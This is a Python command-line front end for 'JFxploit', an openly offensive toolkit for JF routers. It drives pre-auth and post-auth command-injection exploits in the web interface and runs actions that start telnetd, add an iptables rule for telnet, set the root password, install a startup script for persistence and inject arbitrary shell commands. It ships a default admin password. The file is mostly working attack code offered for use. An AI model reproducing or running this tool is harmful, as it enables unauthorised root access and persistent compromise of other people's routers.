# JFxploit — CLI toolkit for exploiting web interface vulnerabilities in JF routers.
# Copyright (C) 2026 JFC-Group (https://github.com/JFC-Group)
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.
"""
JFxploit — CLI toolkit for JF router exploitation.
"""
from __future__ import annotations

import sys
from typing import Annotated, Optional

import typer
from rich import print as rprint
from rich.console import Console
from rich.panel import Panel
from rich.table import Table

from .actions import build_payload, check_telnet
from .core.models import Target
from .exploits import all_exploits, auto_select, get as get_exploit

app = typer.Typer(
    name="jfxploit",
    help="CLI toolkit for JF router exploitation",
    rich_markup_mode="rich",
    no_args_is_help=True,
)
console = Console()

BANNER = """[bold blue]
╔══════════════════════════════════════════════════════════════╗
║                  JFxploit — JF Exploit Toolkit               ║
║                  https://github.com/JFC-Group                ║
╚══════════════════════════════════════════════════════════════╝
[/bold blue][dim]JFxploit  Copyright (C) 2026 JFC-Group (https://github.com/JFC-Group)
This program comes with ABSOLUTELY NO WARRANTY; for details run `jfxploit warranty'.
This is free software, and you are welcome to redistribute it
under certain conditions; run `jfxploit conditions' for details.[/dim]
"""

EXPLOIT_DESCRIPTIONS = {
    "f01": "[green]Pre-Auth[/green]  Mesh Debug RequestMethod header injection",
    "f02": "[yellow]Post-Auth[/yellow] Mesh Login Threshold_Val injection (main exploit)",
    "f04": "[yellow]Post-Auth[/yellow] GPON VLAN ID injection (needs session)",
    "f05": "[yellow]Post-Auth[/yellow] jsonApi speedTest server param injection",
    "f06": "[yellow]Post-Auth[/yellow] jsonApi webDownloadTime website param injection",
}

ACTION_DESCRIPTIONS = {
    "telnet":  "Start telnetd daemon on the router",
    "iptables":"Add iptables rule to allow telnet through firewall",
    "rootpass":"Set custom root password",
    "persist": "Install startup script for persistence across reboots",
    "custom":  "Run arbitrary shell command(s) supplied via --cmd (repeatable)",
    "all":     "Run all of the above (except custom)",
}


def _print_banner() -> None:
    rprint(BANNER)


def _list_exploits_table() -> None:
    table = Table(title="Available Exploits", show_lines=True)
    table.add_column("ID", style="cyan", no_wrap=True)
    table.add_column("Auth", no_wrap=True)
    table.add_column("Description")
    for eid, module in all_exploits().items():
        auth = "[green]Pre-Auth[/green]" if not module.requires_auth else "[yellow]Post-Auth[/yellow]"
        table.add_row(eid, auth, module.description)
    console.print(table)


def _list_actions_table() -> None:
    table = Table(title="Available Actions", show_lines=True)
    table.add_column("Action", style="cyan", no_wrap=True)
    table.add_column("Description")
    for action, desc in ACTION_DESCRIPTIONS.items():
        table.add_row(action, desc)
    console.print(table)


@app.command()
def run(
    target: Annotated[str, typer.Argument(help="Router IP or hostname (e.g. 192.168.29.1)")],
    port: Annotated[int, typer.Option("--port", "-p", help="Router web UI port")] = 80,
    username: Annotated[str, typer.Option("--user", "-u", help="Admin username")] = "superadmin",
    password: Annotated[str, typer.Option("--password", "-P", help="Admin password")] = "87jMB=DU",
    root_pass: Annotated[str, typer.Option("--root-pass", "-r", help="Root password to set on router")] = "pa$$w0rd",
    telnet_port: Annotated[int, typer.Option("--telnet-port", "-t", help="Telnet port to open")] = 23,
    exploit_id: Annotated[
        Optional[str],
        typer.Option(
            "--exploit", "-e",
            help="Exploit to use: f01 f02 f04 f05 f06 or auto (default: auto)",
        ),
    ] = None,
    actions: Annotated[
        Optional[list[str]],
        typer.Option(
            "--action", "-a",
            help="Action(s) to perform: telnet iptables rootpass persist all (repeatable, default: all)",
        ),
    ] = None,
    cmd: Annotated[
        Optional[list[str]],
        typer.Option(
            "--cmd", "-c",
            help="Shell command to inject (repeatable). Requires --action custom.",
        ),
    ] = None,
    no_verify: Annotated[bool, typer.Option("--no-verify", help="Skip telnet verification")] = False,
    list_exploits: Annotated[bool, typer.Option("--list-exploits", help="Show available exploits and exit")] = False,
    list_actions: Annotated[bool, typer.Option("--list-actions", help="Show available actions and exit")] = False,
) -> None:
    """Run exploit(s) against a JF router."""
    _print_banner()

    if list_exploits:
        _list_exploits_table()
        raise typer.Exit()

    if list_actions:
        _list_actions_table()
        raise typer.Exit()

    active_actions = actions if actions else ["all"]
    exploit_choice = exploit_id or "auto"

    if cmd and "custom" not in active_actions:
        rprint("[yellow]⚠ --cmd has no effect without --action custom[/yellow]")

    if "custom" in active_actions and not cmd:
        rprint("[red]--action custom requires at least one --cmd value.[/red]")
        raise typer.Exit(1)

    _print_config(target, port, username, password, root_pass, telnet_port, exploit_choice, active_actions, cmd)

    tgt = Target(host=target, port=port, username=username, password=password)
    commands = build_payload(active_actions, root_pass, telnet_port, custom_cmds=cmd)

    if not commands:
        rprint("[red]No commands to execute — check your --action values.[/red]")
        raise typer.Exit(1)

    rprint(f"\n[bold]Shell commands to inject ({len(commands)}):[/bold]")
    for shell_cmd in commands:
        rprint(f"  [dim]»[/dim] {shell_cmd}")

    rprint("\n[bold]Launching exploit...[/bold]")

    if exploit_choice == "auto":
        result = auto_select(tgt, commands)
    else:
        module = get_exploit(exploit_choice)
        result = module.run(tgt, commands)

    _print_result(result)

    if result.success and not no_verify and ("telnet" in active_actions or "all" in active_actions):
        _verify_telnet(target, telnet_port)


def _print_config(
    target: str, port: int, username: str, password: str, root_pass: str,
    telnet_port: int, exploit_choice: str, active_actions: list[str],
    custom_cmds: list[str] | None = None,
) -> None:
    table = Table(show_header=False, box=None, padding=(0, 2))
    table.add_column("Key", style="bold cyan")
    table.add_column("Value")
    table.add_row("Target", f"{target}:{port}")
    table.add_row("Web Username", username)
    table.add_row("Web Password", password)
    table.add_row("Telnet Username", "root")
    table.add_row("Telnet password", root_pass)
    table.add_row("Telnet port", str(telnet_port))
    table.add_row("Exploit", exploit_choice)
    table.add_row("Actions", ", ".join(active_actions))
    if custom_cmds:
        for i, c in enumerate(custom_cmds, 1):
            table.add_row(f"  cmd[{i}]", c)
    console.print(Panel(table, title="[bold]Configuration[/bold]", expand=False))


def _print_result(result) -> None:
    if result.success:
        rprint(f"\n[bold green]✓ Success[/bold green] [{result.exploit_id}] {result.message}")
    else:
        rprint(f"\n[bold red]✗ Failed[/bold red] [{result.exploit_id}] {result.message}")
    if result.raw_response:
        rprint(f"[dim]Response: {result.raw_response[:200]}[/dim]")


def _verify_telnet(host: str, port: int) -> None:
    rprint(f"\n[bold]Verifying telnet on {host}:{port}...[/bold]")
    if check_telnet(host, port, timeout=5, retries=3):
        rprint(f"[bold green]✓ Telnet port {port} is open![/bold green]")
        rprint(f"[dim]Connect with: telnet {host} {port}[/dim]")
    else:
        rprint(f"[yellow]⚠ Telnet port {port} not reachable yet (daemon may still be starting)[/yellow]")


@app.command("exploits")
def cmd_list_exploits() -> None:
    """List all available exploits."""
    _print_banner()
    _list_exploits_table()


@app.command("actions")
def cmd_list_actions() -> None:
    """List all available actions."""
    _print_banner()
    _list_actions_table()


@app.command("warranty")
def cmd_warranty() -> None:
    """Show warranty disclaimer (GPL v3 §15 and §16)."""
    rprint("""[bold]15. Disclaimer of Warranty[/bold]

THERE IS NO WARRANTY FOR THE PROGRAM, TO THE EXTENT PERMITTED BY APPLICABLE LAW.
EXCEPT WHEN OTHERWISE STATED IN WRITING THE COPYRIGHT HOLDERS AND/OR OTHER PARTIES
PROVIDE THE PROGRAM "AS IS" WITHOUT WARRANTY OF ANY KIND, EITHER EXPRESSED OR
IMPLIED, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY
AND FITNESS FOR A PARTICULAR PURPOSE. THE ENTIRE RISK AS TO THE QUALITY AND
PERFORMANCE OF THE PROGRAM IS WITH YOU. SHOULD THE PROGRAM PROVE DEFECTIVE, YOU
ASSUME THE COST OF ALL NECESSARY SERVICING, REPAIR OR CORRECTION.

[bold]16. Limitation of Liability[/bold]

IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING WILL ANY
COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MODIFIES AND/OR CONVEYS THE PROGRAM AS
PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES, INCLUDING ANY GENERAL, SPECIAL,
INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING OUT OF THE USE OR INABILITY TO USE THE
PROGRAM (INCLUDING BUT NOT LIMITED TO LOSS OF DATA OR DATA BEING RENDERED INACCURATE
OR LOSSES SUSTAINED BY YOU OR THIRD PARTIES OR A FAILURE OF THE PROGRAM TO OPERATE
WITH ANY OTHER PROGRAMS), EVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE
POSSIBILITY OF SUCH DAMAGES.

[dim]Full license: LICENSE.md  or  <https://www.gnu.org/licenses/gpl-3.0.html>[/dim]""")


@app.command("conditions")
def cmd_conditions() -> None:
    """Show redistribution conditions (GPL v3 summary)."""
    rprint("""[bold]Redistribution Conditions — GNU General Public License v3[/bold]

You are free to:
  • Run the program for any purpose
  • Study and modify the source code
  • Redistribute verbatim copies
  • Distribute your modified versions

Under these conditions:
  • Any distributed copy (modified or not) must carry this license and copyright notice
  • Modified versions must be clearly marked as changed
  • The complete corresponding source code must be made available under GPL v3
  • You may not impose additional restrictions on recipients' exercise of these rights

[dim]Full license text: LICENSE.md  or  <https://www.gnu.org/licenses/gpl-3.0.html>[/dim]""")
